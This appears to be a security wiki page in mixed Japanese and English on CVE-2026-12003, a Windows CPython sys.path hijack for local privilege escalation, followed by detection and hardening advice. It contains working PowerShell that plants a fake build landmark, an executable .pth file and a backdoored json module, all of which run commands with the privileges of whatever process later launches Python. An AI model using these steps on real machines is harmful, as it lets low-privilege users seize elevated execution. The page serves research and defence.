# Windows CPython Build-Landmark と `sys.path` Hijacking

{{#include ../../../banners/hacktricks-training.md}}

runtime は、もともと build tree 内でのみ使用されるはずだった相対パスを保持することがあります。privileged runtime がそのパスの1つを low-privilege で書き込み可能な directory に解決すると、attacker は想定された **build landmark** を配置し、runtime に別の library prefix を信頼させることができます。CVE-2026-12003 は Windows CPython の例です。配置した `Modules\Setup.local` により、保護された Python installation を変更せずに `sys.path` 内の standard-library entry を redirect できます。<sup>[[1]](#references)[[2]](#references)</sup>

## CPython path-construction chain

影響を受ける Windows build は `VPATH=..\..` をコンパイルし、これを `sys._vpath` として公開していました。`Modules/getpath.py` の脆弱な fallback は、`VPATH\Modules\Setup.local` を interpreter が source tree から実行されている証拠として扱っていました。以下の data flow により、この build-time の値が runtime の search-path primitive に変わります。<sup>[[1]](#references)[[2]](#references)</sup>

| Stage | `C:\Program Files\Python314\python.exe` に対する Derived value |
| --- | --- |
| Compiled build path | `VPATH=..\..` |
| Runtime build landmark | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Attacker-created landmark | `C:\Modules\Setup.local` |
| Selected `build_prefix` | `C:\` |
| Selected standard library | `C:\Lib` |
| Result | Attacker-controlled `C:\Lib` が `sys.path` に append される |

この check は、executable の隣にある、より具体的な `pybuilddir.txt` が存在しないか、readable でない場合に使用される fallback です。これは、low-privilege user が `C:\Program Files\Python314` を変更できなくても、`C:\` に新しい directory を作成できる可能性があるため重要です。その後、privileged な `python.exe` process が自身の access token を使用して Python code を load します。<sup>[[1]](#references)[[2]](#references)</sup>

### Preconditions

以下の条件がすべて成立する場合に限り、これを privilege boundary として扱ってください。<sup>[[1]](#references)[[2]](#references)</sup>

- Target が影響を受ける **Windows CPython** build であること。脆弱な path logic は Python-language の特性ではありません。
- `python.exe` を含む directory から `..\..` を解決して得られる directory で、less-privileged user が landmark と `Lib` tree を作成できること。
- higher-privileged user、service、installer、または software-deployment account が後からその interpreter を起動すること。
- path-isolation configuration によって脆弱な discovery path が override されていないこと。

## Enumeration

compiled value と effective search path の両方を確認します。公開された `..\..` の値は有用な lead ですが、それだけでは exploitability の証明になりません。path も解決し、ACL を確認し、配置した landmark が protected installation の外部になることを確認してください。<sup>[[1]](#references)[[2]](#references)</sup>
```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```
公式インストーラーだけに評価対象を限定しないでください。`python.exe` をバンドルするすべての製品について、実際の実行ファイルディレクトリを基準に `sys._vpath` を解決し、結果として得られる `Modules` および `Lib` の場所の ACL を確認してください。より深いインストールパスでは、`C:\` ではなく、別の書き込み可能なアプリケーションディレクトリまたはベンダーディレクトリに解決される場合があります。<sup>[[1]](#references)</sup>

## Lab exploitation workflow

以下の lab PoC は、選択した prefix 配下にある正規の runtime を十分に再現して Python を初期化できるようにし、実行可能な `.pth` 行を追加して、最後に landmark を作成します。不完全なライブラリツリーをインタープリターが一時的に参照する状態を残さないよう、landmark より先に payload を作成してください。<sup>[[1]](#references)</sup>
```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```
通常の site 初期化中、Python は認識された site-packages ディレクトリ内の `.pth` ファイルを処理します。空白が続く `import` で始まる行のみが実行され、実行可能な文は1つの物理行に収める必要があります。`python -S` は自動的な `site` の import を抑制するため、この trigger は発生しません。<sup>[[1]](#references)[[4]](#references)</sup>

### Import-triggered alternative

Startup execution は必須ではありません。正規の library tree を再現した後、特権スクリプトが予測可能な形で import する module に backdoor を仕込みます。例えば、配置した `Lib\json\__init__.py` に code を追加すると、victim が `json` を import したときに実行されます。広く import されるわけではないものの、確実性の高い module を選ぶことで、trigger をより目立たなくできます。<sup>[[1]](#references)</sup>
```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```
このvariantは依然としてimporting processのtokenを継承しますが、target applicationがmodified moduleをimportすることが前提になります。実際のsoftwareをテストする場合は、original moduleの動作を維持してください。そうしないと、意図したprivileged workflowが完了する前にimportが失敗する可能性があります。<sup>[[1]](#references)</sup>

## Pre-installation planting

Search-path plantingはinstallationに先行して実行できます。低権限ユーザーは、将来使用される`Lib`ツリーと`Modules\Setup.local`をあらかじめ準備し、その後、privileged software portal、help-desk workflow、またはdeployment systemが全ユーザー向けinstallationを実行するのを待機できます。新しいinterpreterを起動してpackageをinstallしたりstandard libraryをprecompileしたりするinstallerは、administratorが手動でPythonを開かなくても、deployment accountの権限でpayloadを実行させる可能性があります。<sup>[[1]](#references)</sup>

これによりdeployment reviewの観点も変わります。bundled runtimeをinstallまたはupgradeする**前に**、書き込み可能な親ディレクトリと、すでに存在するlandmark/libraryディレクトリを確認してください。deployment後に最終installation directoryだけを確認するのでは不十分です。<sup>[[1]](#references)</sup>

## Detection and hardening

有用なhost pivotは、予期しないlandmarkとlibrary tree、続いて発生するprivileged Python launchです。`Modules\Setup.local`、root-levelまたはそれ以外の場所にある`Lib\site-packages\*.pth`、コピーされたstandard-library package、そしてownerまたはcreation timeが保護対象のinstallationと異なるmodule fileを調査してください。これらがstandard userによって作成された時刻と、elevated `python.exe`が`cmd.exe`、`powershell.exe`、account-management tool、またはその他の不審なchild processをspawnした時刻を相関分析します。<sup>[[1]](#references)</sup>
```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```
upstream fixでは`VPATH\Modules\Setup.local`のfallbackを削除し、`pybuilddir.txt`をbuild-tree indicatorとして唯一のものにします。固定されたbuild、または現行のPython install managerで管理されるper-user installationを優先してください。アップグレードが一時的に不可能な場合は、解決されたancestorを保護し、制限的なACLを設定した`Modules`を事前に作成してください。制御された`._pth`ファイルまたは`PYTHONHOME`でもdiscoveryを変更できますが、application compatibility testingが必要です。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003: Windows CPythonのSearch-Path HijackingとLocal Privilege Escalation](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [CPython issue #151544 - install directoryを変更せずにin-tree search pathsを有効化可能](https://github.com/python/cpython/issues/151544)
- [3] [CPython pull request #151545 - `VPATH/Modules/Setup.local`のfallbackを削除](https://github.com/python/cpython/pull/151545)
- [4] [Python documentation - `site` path configuration files](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
